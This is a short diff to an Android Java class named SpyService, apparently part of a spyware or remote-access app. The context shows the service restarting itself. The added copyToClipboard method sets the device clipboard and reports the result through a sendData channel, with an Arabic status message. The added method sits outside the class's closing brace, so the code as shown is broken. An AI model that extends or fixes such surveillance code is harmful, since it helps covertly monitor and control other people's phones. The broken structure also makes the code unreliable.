@@ -822,3 +822,10 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
+
+    private void copyToClipboard(String text) {
+        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        android.content.ClipData clip = android.content.ClipData.newPlainText("Result", text);
+        clipboard.setPrimaryClip(clip);
+        sendData("CLIPBOARD", "✅ تم نسخ النتيجة إلى الحافظة");
+    }
